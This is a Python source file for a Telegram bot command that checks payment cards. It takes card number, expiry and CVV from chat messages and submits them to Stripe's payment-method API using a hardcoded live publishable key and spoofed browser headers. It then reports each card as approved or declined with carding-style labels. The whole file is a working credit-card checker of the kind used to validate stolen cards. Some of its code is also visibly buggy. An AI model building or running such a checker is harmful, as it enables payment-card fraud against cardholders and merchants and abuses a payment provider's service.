from main import bot
import logging
import os
import requests
import time
import string
import random
from defs import *
from main import bot
from time import sleep
from bs4 import BeautifulSoup
session = requests.session()
#N = 10
#rnd = ''.join(random.choices(string.ascii_lowercase +
                              #  string.digits, k = N))
BLACKLISTED = [400189]
@bot.message_handler(commands=['offhai'])
async def ch(message):
	file = open('groups.txt', 'r') 
	if str(message.chat.id) + "\n" not in file.readlines():
		await bot.reply_to(message,'Chat id Not Authorized')
	#elif str(message.from_user.id) + "\n" not in file.readlines():
		#await bot.reply_to(message,'You are not authorized')
	else:
         tic = time.perf_counter()
         cc = message.text[len('/chk '):]
         splitter = cc.split('|')
         ccn = splitter[0]
         mm = splitter[1]
         yy = splitter[2]
         cvv = splitter[3]
         email = f"anirbajhaihsojhek@gmail.com"
         if not cc:
             return await bot.reply_to(
                 "<code>Send Card /chk cc|mm|yy|cvv.</code>"
             )   
         BIN = cc[:6]
         if BIN in BLACKLISTED:
             return await bot.reply_to(
                 "<b>BLACKLISTED BIN</b>"
                )
    # get guid muid sid
#    headers = {
#        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
#        "Accept": "application/json, text/plain, */*",
#        "Content-Type": "application/x-www-form-urlencoded"
#    }
 #   s = session.post("https://m.stripe.com/6",
#                     headers=headers)
#    r = s.json()
#    Guid = r["guid"]
#    Muid = r["muid"]
    #Sid = r["sid"]
    
    # now 1 req
         payload = {
          "type": "card",
          "billing_details[name]": "Seon cc",
          "card[number]": ccn,
          "card[cvc]": cvv,
          "card[exp_month]": mm,
          "card[exp_year]": yy,
          "guid": "9253315b-1a39-478e-9e6d-5a40a5c72e23bea1ca",
          "muid": "89540ccb-7f39-45fa-8b65-6983aa5295f4f9720d",
          "sid": "a5682bb6-f9aa-44c6-b97e-0655e59e8800a9f8f7",
          "pasted_fields": "number",
          "payment_user_agent": "stripe.js%2F97dd66212%3B+stripe-js-v3%2F97dd66212",
          "time_on_page": "185000",
          "key": "pk_live_51CUoguFFMpxKxk7UfeKkkhB208gCqN6afPs5CnUGOGyjvNkfbyAE7uGLJxN8BGTmDxBj8g3SK8FS0ffTxp4iT8ZK00EcixeE0Q"}
    
         head = {
           "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded",
           "Accept": "application/json",
           "content-type": "application/x-www-form-urlencoded",
           "Origin": "https://js.stripe.com",
           "Referer": "https://js.stripe.com/",
           "Accept-Language": "en-US,en;q=0.9"}
    
         rx = session.post("https://api.stripe.com/v1/payment_methods",
                           data=payload, headers=head)
         mess = await bot.reply_to(message,"Checking wait")
         edit1 = await bot.edit_message_text("Under Proccesing.. ",message.chat.id,mess.id,parse_mode="HTML")
         sleep(3)
         edit2 = await bot.edit_message_text("Under Proccesing.. 60%",message.chat.id,edit1.id,parse_mode="HTML")
         sleep(3)
         res = rx.text
         token = find_between(res,'"id": "','"')
         toc = time.perf_counter()
         if "incorrect_cvc" in rx.text:
               await bot.edit_message_text(f"""
 ✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ 
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
         elif "Unrecognized request URL" in rx.text:
             await bot.edit_message_text("[UPDATE] PROXIES ERROR")
    #elif rx.status_code == 200:
      #  await bot.reply_to(message,"""
#✔️<b>CC</b>➟ <code>{cc}</code>
#<b>STATUS</b>➟ 
#<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
#<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
#""")
         elif "cvc_check" in rx.text:
         	await bot.edit_message_text(f"""
✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #cvc_check": null
<b>MSG</b>➟ cvc_check": null
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
         else:
             await bot.edit_message_text(f"""
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ 
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")